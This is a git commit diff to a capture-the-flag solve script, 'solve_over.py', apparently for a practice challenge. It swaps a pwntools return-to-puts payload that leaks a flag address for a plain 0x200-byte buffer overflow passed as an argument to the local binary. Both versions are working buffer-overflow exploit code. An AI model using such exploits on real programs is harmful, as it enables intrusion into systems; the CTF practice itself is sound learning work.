1c884c9aefb17a0e5c1a87b1d29723af4a27807a
cheaterdxd <44997314+cheaterdxd@users.noreply.github.com>
2019-10-10 00:35:42 +0700

    Update solve_over.py

--- Overflow-0/solve_over.py
+++ Overflow-0/solve_over.py
@@ -1,12 +1,4 @@
 from pwn import *
-s = process(['./vuln_oveflow','abc'])
-raw_input('debug')
-flag_add = 0x804a080
-puts_add = 0x80484c0
-main = 0x80486c9 
-payload = 'a'*0x8c 
-payload += p32(puts_add)
-payload += p32(main)
-payload += p32(flag_add)
-s.sendline(payload)
+payload = 'a'*0x200
+s = process(['./vuln_oveflow',payload])
 s.interactive()
